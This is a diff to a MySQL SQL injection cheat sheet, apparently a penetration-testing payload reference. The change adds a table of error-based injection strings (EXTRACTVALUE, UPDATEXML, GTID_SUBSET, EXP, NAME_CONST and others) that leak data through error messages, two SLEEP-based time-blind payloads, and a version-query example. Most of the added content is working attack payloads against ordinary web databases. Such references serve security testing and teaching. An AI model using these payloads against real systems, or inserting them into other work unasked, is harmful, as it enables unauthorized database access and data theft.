@@ -69,7 +69,7 @@ MySQL comments are annotations in SQL code that are ignored by the MySQL server 
 | `/* MYSQL Comment */`      | C-style comment                   |
 | `/*! MYSQL Special SQL */` | Special SQL                       |
 | `/*!32302 10*/`            | Comment for MYSQL version 3.23.02 |
-| `-- -`                     | SQL comment                       |
+| `--`                       | SQL comment                       |
 | `;%00`                     | Nullbyte                          |
 | \`                         | Backtick                          |
 
@@ -229,6 +229,17 @@ MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SE
 
 ## MYSQL Error Based
 
+| Name         | Payload         |
+| ------------ | --------------- |
+| GTID_SUBSET  | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -` |
+| JSON_KEYS    | `AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -` |
+| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -` |
+| UPDATEXML    | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -` |
+| EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -` |
+| OR           | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -` |
+| NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--` |
+
+
 ### MYSQL Error Based - Basic
 
 Works with `MySQL >= 4.1`
@@ -373,6 +384,8 @@ The following SQL codes will delay the output from MySQL.
     RLIKE SLEEP([SLEEPTIME])
     OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
     XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
+    AND SLEEP(10)=0
+    AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)
     ```
 
 ### Using SLEEP in a Subselect
@@ -662,12 +675,19 @@ mysql> SELECT @@version;
 | 5.6.31-0ubuntu0.15.10.1 |
 +-------------------------+
 
-mysql> mysql> SELECT version();
+mysql> SELECT version();
 +-------------------------+
 | version()               |
 +-------------------------+
 | 5.6.31-0ubuntu0.15.10.1 |
 +-------------------------+
+
+mysql> SELECT @@GLOBAL.VERSION;
++------------------+
+| @@GLOBAL.VERSION |
++------------------+
+| 8.0.27           |
++------------------+
 ```
 
 
